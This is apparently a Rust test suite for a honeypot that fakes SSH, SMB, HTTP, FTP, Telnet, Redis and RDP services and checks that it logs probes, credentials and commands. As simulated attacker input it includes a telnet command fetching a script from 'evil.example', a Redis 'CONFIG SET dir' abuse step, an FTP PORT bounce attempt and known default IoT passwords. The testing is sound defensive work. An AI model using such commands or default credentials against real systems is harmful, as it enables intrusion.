use honeypot::event::Kind;
use honeypot::log::EventLog;
use honeypot::net::{accept_loop, bind, App};
use honeypot::services::Service;
use std::net::{IpAddr, Ipv4Addr, SocketAddr};
use std::sync::Arc;
use std::time::Duration;
use tokio::io::{AsyncReadExt, AsyncWriteExt};
use tokio::net::TcpStream;
use tokio::sync::Semaphore;

fn app_and_rx() -> (App, tokio::sync::mpsc::Receiver<honeypot::event::Event>) {
    let (log, rx) = EventLog::channel(64);
    (App::for_test(log), rx)
}

async fn start(
    svc: Service,
) -> (
    u16,
    tokio::task::JoinHandle<()>,
    tokio::sync::mpsc::Receiver<honeypot::event::Event>,
) {
    let (app, rx) = app_and_rx();
    let listener = bind(SocketAddr::new(IpAddr::V4(Ipv4Addr::LOCALHOST), 0)).unwrap();
    let port = listener.local_addr().unwrap().port();
    let handle = tokio::spawn(accept_loop(listener, app, svc));
    (port, handle, rx)
}

async fn connect(port: u16) -> TcpStream {
    TcpStream::connect(("127.0.0.1", port)).await.unwrap()
}

async fn wait_kind(
    rx: &mut tokio::sync::mpsc::Receiver<honeypot::event::Event>,
    kind: Kind,
) -> honeypot::event::Event {
    tokio::time::timeout(Duration::from_secs(2), async {
        loop {
            let ev = rx.recv().await.expect("event");
            if ev.event == kind {
                return ev;
            }
        }
    })
    .await
    .expect("timed out waiting for event")
}

#[tokio::test]
async fn ssh_banner_and_client_ident() {
    let (port, h, mut rx) = start(Service::Ssh { port: 0 }).await;
    let mut s = connect(port).await;
    let mut buf = [0u8; 64];
    let n = s.read(&mut buf).await.unwrap();
    let banner = String::from_utf8_lossy(&buf[..n]);
    assert!(banner.starts_with("SSH-2.0-OpenSSH_8.9p1"), "{banner}");
    s.write_all(b"SSH-2.0-libssh2_1.11.0\r\n").await.unwrap();
    let ev = wait_kind(&mut rx, Kind::Probe).await;
    assert_eq!(ev.client.as_deref(), Some("SSH-2.0-libssh2_1.11.0"));
    h.abort();
}

#[tokio::test]
async fn smb_negotiate_looks_like_windows() {
    let (port, h, mut rx) = start(Service::Smb { port: 0 }).await;
    let mut s = connect(port).await;
    // NetBIOS + SMB2 negotiate (command 0), message id 1.
    let mut pkt = vec![0u8; 4 + 64];
    pkt[3] = 64;
    pkt[4..8].copy_from_slice(b"\xfeSMB");
    pkt[8..10].copy_from_slice(&64u16.to_le_bytes());
    pkt[28..36].copy_from_slice(&1u64.to_le_bytes());
    s.write_all(&pkt).await.unwrap();
    let mut buf = [0u8; 256];
    let n = tokio::time::timeout(Duration::from_secs(2), s.read(&mut buf))
        .await
        .unwrap()
        .unwrap();
    assert!(n > 8, "smb response too short");
    assert_eq!(&buf[4..8], b"\xfeSMB");
    let ev = wait_kind(&mut rx, Kind::Probe).await;
    assert_eq!(ev.svc, "smb");
    h.abort();
}

#[tokio::test]
async fn http_logs_get_and_serves_login() {
    let (port, h, mut rx) = start(Service::Http { port: 0 }).await;
    let mut s = connect(port).await;
    s.write_all(b"GET / HTTP/1.1\r\nHost: cam\r\nUser-Agent: nmap\r\n\r\n")
        .await
        .unwrap();
    let mut buf = vec![0u8; 2048];
    let n = tokio::time::timeout(Duration::from_secs(2), s.read(&mut buf))
        .await
        .unwrap()
        .unwrap();
    let body = String::from_utf8_lossy(&buf[..n]);
    assert!(body.contains("File Server"), "{body}");
    let ev = wait_kind(&mut rx, Kind::Probe).await;
    assert_eq!(ev.method.as_deref(), Some("GET"));
    assert_eq!(ev.ua.as_deref(), Some("nmap"));
    h.abort();
}

#[tokio::test]
async fn http_captures_post_password() {
    let (port, h, mut rx) = start(Service::Http { port: 0 }).await;
    let mut s = connect(port).await;
    let body = "username=admin&password=admin";
    let req = format!(
        "POST /login.html HTTP/1.1\r\nHost: cam\r\nContent-Length: {}\r\nContent-Type: application/x-www-form-urlencoded\r\n\r\n{body}",
        body.len()
    );
    s.write_all(req.as_bytes()).await.unwrap();
    let ev = wait_kind(&mut rx, Kind::Password).await;
    assert_eq!(ev.user.as_deref(), Some("admin"));
    assert_eq!(ev.pass.as_deref(), Some("admin"));
    h.abort();
}

#[tokio::test]
async fn ftp_user_pass_and_refuses_port() {
    let (port, h, mut rx) = start(Service::Ftp { port: 0 }).await;
    let mut s = connect(port).await;
    let mut buf = [0u8; 128];
    let n = s.read(&mut buf).await.unwrap();
    assert!(String::from_utf8_lossy(&buf[..n]).starts_with("220"));

    s.write_all(b"USER root\r\n").await.unwrap();
    let n = s.read(&mut buf).await.unwrap();
    assert!(String::from_utf8_lossy(&buf[..n]).starts_with("331"));
    s.write_all(b"PASS hunter2\r\n").await.unwrap();
    let ev = wait_kind(&mut rx, Kind::Password).await;
    assert_eq!(ev.user.as_deref(), Some("root"));
    assert_eq!(ev.pass.as_deref(), Some("hunter2"));
    h.abort();
}

#[tokio::test]
async fn ftp_port_is_not_a_proxy() {
    let (port, h, mut rx) = start(Service::Ftp { port: 0 }).await;
    let mut s = connect(port).await;
    let mut buf = [0u8; 128];
    let _ = s.read(&mut buf).await.unwrap();
    s.write_all(b"PORT 127,0,0,1,0,80\r\n").await.unwrap();
    let n = s.read(&mut buf).await.unwrap();
    let resp = String::from_utf8_lossy(&buf[..n]);
    assert!(resp.starts_with("425"), "{resp}");
    let ev = wait_kind(&mut rx, Kind::Command).await;
    assert_eq!(ev.client.as_deref(), Some("data-channel-refused"));
    h.abort();
}

#[tokio::test]
async fn telnet_login_and_command() {
    let (port, h, mut rx) = start(Service::Telnet { port: 0 }).await;
    let mut s = connect(port).await;
    let mut buf = vec![0u8; 512];
    let _ = tokio::time::timeout(Duration::from_secs(2), s.read(&mut buf))
        .await
        .unwrap()
        .unwrap();
    s.write_all(b"root\r\n").await.unwrap();
    let _ = tokio::time::timeout(Duration::from_secs(2), s.read(&mut buf))
        .await
        .unwrap()
        .unwrap();
    s.write_all(b"xc3511\r\n").await.unwrap();
    let ev = wait_kind(&mut rx, Kind::Password).await;
    assert_eq!(ev.user.as_deref(), Some("root"));
    assert_eq!(ev.pass.as_deref(), Some("xc3511"));
    let _ = tokio::time::timeout(Duration::from_secs(2), s.read(&mut buf))
        .await
        .unwrap()
        .unwrap();
    s.write_all(b"wget http://evil.example/x.sh\r\n")
        .await
        .unwrap();
    let ev = wait_kind(&mut rx, Kind::Command).await;
    assert!(ev.data.as_deref().unwrap_or("").contains("wget"));
    h.abort();
}

#[tokio::test]
async fn redis_ping_and_hostile_config() {
    let (port, h, mut rx) = start(Service::Redis { port: 0 }).await;
    let mut s = connect(port).await;
    s.write_all(b"PING\r\n").await.unwrap();
    let mut buf = [0u8; 64];
    let n = s.read(&mut buf).await.unwrap();
    assert_eq!(&buf[..n], b"+PONG\r\n");
    s.write_all(b"CONFIG SET dir /tmp\r\n").await.unwrap();
    let n = s.read(&mut buf).await.unwrap();
    assert!(String::from_utf8_lossy(&buf[..n]).starts_with("-ERR"));
    let ev = wait_kind(&mut rx, Kind::Command).await;
    assert!(
        ev.client
            .as_deref()
            .unwrap_or("")
            .to_ascii_uppercase()
            .contains("PING")
            || ev.data.as_deref().unwrap_or("").contains("PING")
    );
    h.abort();
}

#[tokio::test]
async fn rdp_cookie() {
    let (port, h, mut rx) = start(Service::Rdp { port: 0 }).await;
    let mut s = connect(port).await;
    s.write_all(b"Cookie: mstshash=Administrator\r\n")
        .await
        .unwrap();
    let ev = wait_kind(&mut rx, Kind::Password).await;
    assert_eq!(ev.user.as_deref(), Some("Administrator"));
    h.abort();
}

#[tokio::test]
async fn connection_cap_drops_excess() {
    let (log, mut rx) = EventLog::channel(64);
    let mut app = App::for_test(log);
    app.cap = Arc::new(Semaphore::new(1));
    let listener = bind(SocketAddr::new(IpAddr::V4(Ipv4Addr::LOCALHOST), 0)).unwrap();
    let port = listener.local_addr().unwrap().port();
    let h = tokio::spawn(accept_loop(listener, app, Service::Ssh { port: 0 }));

    let _hold = connect(port).await;
    tokio::time::sleep(Duration::from_millis(50)).await;
    let _second = connect(port).await;
    let ev = wait_kind(&mut rx, Kind::ConnectDropped).await;
    assert_eq!(ev.svc, "ssh");
    h.abort();
}
